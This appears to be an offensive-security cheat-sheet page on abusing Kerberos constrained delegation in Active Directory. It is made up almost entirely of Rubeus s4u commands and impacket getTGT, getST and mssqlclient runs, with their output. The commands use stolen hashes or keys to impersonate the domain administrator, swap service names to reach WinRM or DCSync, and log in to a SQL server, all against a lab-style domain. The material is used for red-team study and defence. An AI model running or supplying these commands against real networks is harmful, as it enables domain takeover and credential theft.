---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/kerberos-attack/constrained-delegation
---

# Constrained Delegation

Constrained delegation is configured on the **computer** or **user** object. It is set through the _<mark style="color:red;">**msds-allowedtodelegateto**</mark>_ property by specifying the SPNs the current object is allowed constrained delegation against.

## Abuse from Windows System

```powershell
# Rubeus
C:\Tools> Rubeus.exe s4u /ticket:doIE2QuY29ycDEuY29t... /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.vulnableone.local:1433 /ptt

# AltService HTTP - Winrm
C:\Tools> Rubeus.exe s4u /user:appsvc /aes256:$AES256_Keys /impersonateuser:administrator /msdsspn:CIFS/mssql.vulnableone.local /altservice:HTTP /domain:vulnableone.local /ptt

# AltService LDAP - DCSync
C:\Tools> Rubeus.exe s4u /user:appsvc /rc4:$NTLM_Hash /impersonateuser:administrator /domain:vulnableonelocal /msdsspn:nmagent/pp-dc.vulnableone.local /altservice:ldap /dc:pp-dc.vulnableone.local /ptt

```

## Abuse from Linux System

### Requesting TGT

```python
└─$ impacket-getTGT vulnableone.local/svc -hashes :$NTLM_Hash
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in svc.ccache
```

Exporting Ticket

```bash
└─$ export KRB5CCNAME=svc.ccache

└─$ klist
Ticket cache: FILE:svc.ccache
Default principal: svc@vulnableone.local

Valid starting       Expires              Service principal
02/25/2024 19:27:59  02/26/2024 05:27:59  krbtgt/vulnableone.local@vulnableone.local
        renew until 02/26/2024 19:27:59
```

### Requesting service ticket and impersonating the administrator user

```python
└─$ impacket-getST -spn mssqlsvc/sql01.vulnableone.local:1433 -impersonate administrator vulnableone.local/svc -k -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

Export ticket

```bash
└─$ export KRB5CCNAME=administrator.ccache 

└─$ klist
Ticket cache: FILE:administrator.ccache
Default principal: administrator@vulnableone.local

Valid starting       Expires              Service principal
02/25/2024 19:29:47  02/26/2024 05:27:59  mssqlsvc/sql01.vulnableone.local:1433@vulnableone.local
```

### Impacket-mssqlclient

```python
└─$ impacket-mssqlclient sql01.vulnableone.local -k

> SELECT SYSTEM_USER;
> SELECT IS_SRVROLEMEMBER('sysadmin');
> SELECT CURRENT_USER;
```
